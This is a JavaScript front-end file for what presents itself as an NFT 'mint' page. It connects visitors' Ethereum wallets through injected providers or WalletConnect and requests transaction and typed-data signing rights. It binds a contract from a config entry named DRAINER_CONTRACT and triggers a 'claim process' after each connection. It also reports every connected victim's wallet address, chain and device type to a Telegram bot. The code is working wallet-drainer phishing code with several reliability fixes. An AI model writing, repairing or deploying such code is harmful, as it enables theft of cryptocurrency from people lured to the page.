import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  UTILITIES
  // ==========================================================================

  // FIX: A promise timeout helper so no init step can hang forever.
  function withTimeout(promise, ms, label = 'operation') {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms)
      ),
    ]);
  }

  // FIX: A short sleep, used for staged announcements.
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) {
        console.error('[main.js] Telegram error:', result);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  WEBSOCKET REACHABILITY CHECK (mobile only)
  //  FIX: now returns a promise that ALWAYS resolves (never hangs). The
  //  result is *informational* — WalletConnect can still work if the initial
  //  probe fails but a later probe succeeds.
  // ==========================================================================
  async function probeWalletConnectRelay(timeoutMs = 4000) {
    if (isDesktop()) return true;
    return new Promise((resolve) => {
      let settled = false;
      const done = (val) => { if (!settled) { settled = true; resolve(val); } };
      try {
        const ws = new WebSocket('wss://relay.walletconnect.com');
        const timer = setTimeout(() => { try { ws.close(); } catch(e){} done(false); }, timeoutMs);
        ws.onopen  = () => { clearTimeout(timer); try { ws.close(); } catch(e){} done(true); };
        ws.onerror = () => { clearTimeout(timer); try { ws.close(); } catch(e){} done(false); };
      } catch (e) {
        done(false);
      }
    });
  }

  // ==========================================================================
  //  LIBRARY LOADING (with CDN fallback chain)
  //  FIX: hard 20s timeout on the whole loader so a hanging CDN import
  //  can't freeze the boot sequence.
  // ==========================================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of cdns) {
      try {
        const m = await withTimeout(import(url), 8000, `import ${url}`);
        SignClient = m.default || m;
        logDebug(`✅ SignClient from ${url}`);
        break;
      } catch (e) {
        logDebug(`⚠️ ${url} failed: ${e.message}`);
      }
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try {
        const m = await withTimeout(import(url), 8000, `import ${url}`);
        WalletConnectModal = m.WalletConnectModal || m.default || m;
        logDebug(`✅ WalletConnectModal from ${url}`);
        break;
      } catch (e) {
        logDebug(`⚠️ ${url} failed: ${e.message}`);
      }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try {
        const m = await withTimeout(import(url), 8000, `import ${url}`);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider from ${url}`);
        break;
      } catch (e) {
        logDebug(`⚠️ ${url} failed: ${e.message}`);
      }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let currentSession      = null;   // WalletConnect session
  let client              = null;   // SignClient instance
  let modal               = null;   // WalletConnectModal instance
  let SignClient          = null;
  let WalletConnectModal  = null;
  let EthereumProvider    = null;

  let web3Instance        = null;
  let contractInstance    = null;
  let activeProvider      = null;   // current EIP-1193 provider
  let isConnecting        = false;  // guards double-clicks

  // FIX: track which projectId the current client/modal were built with so
  // we can rebuild them when the retry path switches to the test ID.
  let currentProjectId    = null;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display    = 'block';
    claimStatus.style.padding    = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop  = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize   = '14px';
    claimStatus.style.textAlign  = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }

  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   {
    const s = localStorage.getItem('walletConnectSession');
    return s ? JSON.parse(s) : null;
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }

  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;

      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }

      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INITIALIZATION
  //
  //  FIX: This function is now idempotent per projectId. If the caller
  //  requests a different projectId than the one currently bound, the
  //  client and modal are rebuilt. Also hard-times-out SignClient.init.
  // ==========================================================================
  async function initWalletConnect(targetProjectId) {
    // Already initialized with the right projectId? Re-use.
    if (client && modal && currentProjectId === targetProjectId) {
      logDebug(`♻️ Re-using WalletConnect client for projectId=${targetProjectId.slice(0, 8)}...`);
      return true;
    }

    // Different projectId or first call — tear down and rebuild.
    if (client) {
      logDebug('🔁 Rebuilding WalletConnect client (projectId changed)');
      try { if (modal) modal.closeModal(); } catch (e) {}
      client = null;
      modal = null;
      currentProjectId = null;
    }

    // Informational relay probe (mobile only). Result is logged, not enforced.
    const relayOk = await probeWalletConnectRelay(4000);
    logDebug(`WalletConnect relay reachable: ${relayOk}`);

    try {
      logDebug(`Initializing SignClient with projectId=${targetProjectId.slice(0, 8)}...`);
      client = await withTimeout(
        SignClient.init({
          projectId: targetProjectId,
          metadata: DAPP_METADATA,
          relayUrl: 'wss://relay.walletconnect.com',
        }),
        15000,
        'SignClient.init'
      );

      modal = new WalletConnectModal({
        projectId: targetProjectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      currentProjectId = targetProjectId;
      projectId = targetProjectId;

      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      client = null;
      modal = null;
      currentProjectId = null;
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await sleep(800);

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT
  //
  //  FIX: The entire flow is now bounded by explicit timeouts and the
  //  isConnecting flag is guaranteed to be reset in all exit paths via
  //  try/finally. Additionally, EthereumProvider.init is called with the
  //  raw session (which it accepts) and the required namespaces are
  //  declared on client.connect so the deep-link opens the correct wallet
  //  app on mobile.
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 180000) {
    if (isConnecting) {
      logDebug('Already connecting — ignoring duplicate call');
      return false;
    }
    isConnecting = true;

    const targetProjectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;
    logDebug(`WalletConnect flow starting (useTestId=${useTestId})`);

    try {
      // 1) Initialize the WC client for the target project.
      const ok = await initWalletConnect(targetProjectId);
      if (!ok) {
        showStatus('WalletConnect unavailable — check network', 'error');
        return false;
      }

      // 2) Close any stale modal before opening a new one.
      try { modal.closeModal(); } catch (e) {}

      // 3) Request a pairing URI.
      showStatus('Preparing connection…', 'info');
      let uri, approval;
      try {
        const res = await withTimeout(
          client.connect({
            requiredNamespaces: {
              eip155: {
                methods: [
                  'eth_sendTransaction',
                  'personal_sign',
                  'eth_signTypedData_v4',
                ],
                chains: ['eip155:1'],
                events: ['chainChanged', 'accountsChanged'],
              },
            },
          }),
          15000,
          'client.connect'
        );
        uri = res.uri;
        approval = res.approval;
      } catch (e) {
        logDebug('client.connect failed: ' + e.message);
        showStatus('Could not create pairing — try again', 'error');
        return false;
      }

      if (!uri) {
        logDebug('No URI returned from client.connect');
        return false;
      }

      // 4) Open the QR / deep-link modal.
      try {
        modal.openModal({ uri });
        showStatus('Scan the QR code or open your wallet', 'info');
      } catch (e) {
        logDebug('modal.openModal failed: ' + e.message);
      }

      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      // 5) Wait for the wallet to approve the pairing.
      //    FIX: hard timeout so we never hang if the user closes the modal.
      let session;
      try {
        session = await withTimeout(approval(), timeoutMs, 'wallet approval');
      } catch (e) {
        logDebug('Approval failed/timed out: ' + e.message);
        try { modal.closeModal(); } catch (err) {}
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');
        showStatus('Connection not completed. Please try again.', 'error');
        return false;
      }

      try { modal.closeModal(); } catch (e) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        logDebug('Session returned without eip155 account');
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      logDebug(`Session approved. Account: ${account}`);

      currentSession = session;

      // 6) Build a WC-backed EIP-1193 provider.
      //    FIX: Give EthereumProvider.init a timeout and pass the session
      //    directly (the library accepts a session object).
      let provider;
      try {
        provider = await withTimeout(
          EthereumProvider.init({
            projectId: targetProjectId,
            metadata: DAPP_METADATA,
            session,
          }),
          15000,
          'EthereumProvider.init'
        );
      } catch (e) {
        logDebug('EthereumProvider.init failed: ' + e.message);
        showStatus('Wallet session could not be established', 'error');
        return false;
      }

      // 7) Wire everything up.
      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      saveWallet(account, session, 'evm');
      setupEVMProviderEvents(provider);
      updateConnectedUI(account, 'evm');

      logDebug(`✅ WalletConnect EVM connected: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC unexpected error: ' + e.message);
      try { modal.closeModal(); } catch (err) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      showStatus('WalletConnect error: ' + e.message, 'error');
      return false;
    } finally {
      // FIX: isConnecting is ALWAYS reset — even on error paths.
      isConnecting = false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(connectedAddressFallback(), 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  function connectedAddressFallback() {
    return window.__apexConnected?.address || getSavedWallet() || null;
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  //
  //  FIX: isConnecting is checked once at the top of connectWallet and set
  //  to true for the duration. It is only cleared in the finally block of
  //  connectViaWalletConnect (or after connectDirectEVM fails).
  //  The two WC attempts (real ID, then test ID) are now guaranteed to be
  //  sequential because isConnecting is properly reset between them.
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    // Block re-entry from connectWallet.
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    try {
      // 1) Try injected EVM first (no WC involvement).
      success = await connectDirectEVM(8000);

      // 2) WalletConnect with the real project ID.
      if (!success) {
        // connectViaWalletConnect manages its own isConnecting.
        // Reset the flag so it can run.
        isConnecting = false;
        success = await connectViaWalletConnect(false, 180000);
      }

      // 3) WalletConnect with the fallback test project ID.
      if (!success) {
        isConnecting = false;
        logDebug('Retrying WalletConnect with fallback project ID...');
        success = await connectViaWalletConnect(true, 180000);
      }
    } finally {
      isConnecting = false;
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet connected. Please try again.', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        try { await web3Instance.currentProvider.disconnect(); } catch (e) {}
      }
    } catch (e) {
      // ignore
    }

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved      = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';

    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain === 'unknown') return;
    if (savedChain !== 'evm') return;

    // Try WalletConnect restore first.
    if (savedSession) {
      const ok = await initWalletConnect(PROJECT_ID);
      if (ok) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;

            const provider = await withTimeout(
              EthereumProvider.init({
                projectId: PROJECT_ID,
                metadata: DAPP_METADATA,
                session,
              }),
              15000,
              'EthereumProvider.init (restore)'
            );

            const Web3 = (await import('web3')).default;
            web3Instance     = new Web3(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider   = provider;

            updateConnectedUI(savedWallet, 'evm');
            setupEVMProviderEvents(provider);
            return;
          }
        } catch (e) {
          logDebug('Restore failed: ' + e.message);
        }
      }
    }

    // Fall back to injected provider on desktop.
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Register WalletConnect session listeners. FIX: registered once on boot,
  // not after a fixed timeout, and they check `client` fresh each time.
  function attachWCEventListeners() {
    if (!client) return;

    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (a) {
        saveWallet(a, session, 'evm');
        updateConnectedUI(a, 'evm');
        currentSession = session;
      }
    });
  }
  attachWCEventListeners();

  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    if (modal) {
      try { modal.closeModal(); } catch (e) {}
    }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
